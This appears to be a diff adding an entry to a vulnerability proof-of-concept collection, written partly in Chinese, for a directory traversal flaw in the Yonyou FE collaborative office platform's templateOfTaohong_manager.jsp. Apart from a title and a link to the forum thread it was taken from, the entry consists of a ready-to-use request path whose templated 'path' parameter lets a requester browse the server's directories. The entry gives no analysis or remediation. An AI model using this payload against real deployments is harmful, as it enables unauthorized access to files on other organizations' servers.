@@ -1,0 +1,6 @@
+# 用友FE协作办公平台 templateOfTaohong_manager.jsp目录遍历
+# 漏洞来源：https://www.cnsuc.net/thread-545.htm
+
+
+POC：
+/system/mediafile/templateofTaoHong_manager.jsp?path={{{path}}}
